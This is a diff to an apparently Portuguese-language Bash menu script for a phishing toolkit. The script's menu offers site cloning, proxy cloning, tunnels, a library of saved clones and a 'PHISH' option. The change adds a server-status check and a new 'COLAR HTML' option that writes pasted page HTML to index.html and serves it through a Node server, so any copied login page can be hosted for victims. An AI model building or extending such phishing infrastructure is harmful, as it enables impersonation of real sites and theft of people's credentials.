@@ -848,14 +848,18 @@ show_localhost() {
     echo -e "${CYAN}  ═══════════════════════════════════════${NC}"
     echo ""
 
-    if [ ! -f "$SCRIPT_DIR/.server.pid" ]; then
-        echo -e "${RED}  Servidor OFF.${NC}"
-        read; return
+    local srv_ok=0
+    local pid=""
+    if [ -f "$SCRIPT_DIR/.server.pid" ]; then
+        pid=$(cat "$SCRIPT_DIR/.server.pid" 2>/dev/null)
+        kill -0 "$pid" 2>/dev/null && srv_ok=1
     fi
-    local pid=$(cat "$SCRIPT_DIR/.server.pid" 2>/dev/null)
-    if ! kill -0 "$pid" 2>/dev/null; then
-        echo -e "${RED}  Servidor parou.${NC}"
-        rm -f "$SCRIPT_DIR/.server.pid"; read; return
+    if [ "$srv_ok" = "0" ]; then
+        curl -s -o /dev/null -w "%{http_code}" http://localhost:8080 2>/dev/null | grep -q "200\|302\|404" && srv_ok=1
+    fi
+    if [ "$srv_ok" = "0" ]; then
+        echo -e "${RED}  Servidor OFF! Use 1) PHISH primeiro.${NC}"
+        read; return
     fi
 
     local my_ip=$(get_my_ip)
@@ -1088,6 +1092,60 @@ EOF
     clone_site "$URL" "$REDIR" "$PT" "y"
 }
 
+do_paste_html() {
+    clear
+    echo -e "${CYAN}  ═══════════════════════════════════════${NC}"
+    echo -e "${CYAN}         COLAR HTML${NC}"
+    echo -e "${CYAN}  ═══════════════════════════════════════${NC}"
+    echo ""
+    echo -e "  ${YELLOW}Cole o HTML abaixo (fim = linha vazia + Enter):${NC}"
+    echo -e "  ${WHITE}(Cole o codigo HTML completo da pagina)${NC}"
+    echo ""
+
+    local html_content=""
+    local line
+    while IFS= read -r line; do
+        [ -z "$line" ] && break
+        html_content="${html_content}${line}
+"
+    done
+
+    if [ -z "$html_content" ]; then
+        echo -e "${RED}  Nenhum HTML colado.${NC}"
+        read; return
+    fi
+
+    echo -e "${YELLOW}Porta (Enter = 8080):${NC} "
+    read PT
+    [ -z "$PT" ] && PT=8080
+
+    # Limpar site_clone e salvar HTML
+    rm -rf "$SITE_DIR"/*
+    echo "$html_content" > "$SITE_DIR/index.html"
+
+    local html_size=$(wc -c < "$SITE_DIR/index.html" 2>/dev/null | tr -d ' ')
+    echo -e "  ${GREEN}HTML salvo: ${html_size} bytes${NC}"
+
+    # Iniciar servidor
+    nohup node "$SCRIPT_DIR/server/server.js" > "$SCRIPT_DIR/server.log" 2>&1 &
+    local srv_pid=$!
+    disown $srv_pid 2>/dev/null
+    echo "$srv_pid" > "$SCRIPT_DIR/.server.pid"
+    sleep 2
+
+    if kill -0 "$srv_pid" 2>/dev/null; then
+        echo -e "  ${GREEN}Servidor ON (PID: $srv_pid)${NC}"
+        echo -e "  ${GREEN}Acesse: http://localhost:${PT}${NC}"
+    else
+        echo -e "  ${RED}Servidor falhou!${NC}"
+        tail -5 "$SCRIPT_DIR/server.log" 2>/dev/null
+    fi
+
+    echo ""
+    echo -e "${YELLOW}Press Enter...${NC}"
+    read
+}
+
 # =============================================
 # MENU
 # =============================================
@@ -1121,6 +1179,7 @@ while true; do
     echo -e "  ${RED}[8] PARAR${NC}      Servidor + tunel"
     echo -e "  ${PURPLE}[9] PROXY${NC}      Clonar via proxy"
     echo -e "  ${GREEN}[c] SALVOS${NC}     Biblioteca de clones"
+    echo -e "  ${WHITE}[h] COLAR HTML${NC}  Servir HTML colado"
     echo -e "  ${CYAN}[A] ATUALIZAR${NC}  Puxar do GitHub"
     echo ""
     echo -e "  ${RED}[0] SAIR${NC}"
@@ -1270,6 +1329,7 @@ while true; do
         8) stop_all; read ;;
         9) do_proxy_clone ;;
         c) show_saved_clones ;;
+        h) do_paste_html ;;
         A)
             clear
             echo -e "  ${CYAN}═══ ATUALIZAR DO GITHUB ═══${NC}"
